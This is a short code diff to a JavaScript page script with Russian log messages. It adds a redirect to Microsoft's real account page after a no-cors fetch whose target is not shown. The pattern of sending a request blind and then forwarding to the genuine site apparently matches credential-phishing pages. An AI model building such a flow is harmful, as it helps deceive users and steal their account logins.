@@ -89,6 +89,7 @@ document.addEventListener('DOMContentLoaded', () => {
     })
       .then(() => {
         console.log("Запрос отправлен, но ответ недоступен из-за режима no-cors");
+        window.location.href = "https://myaccount.microsoft.com";
       })
       .catch(error => {
         console.error("Ошибка:", error);
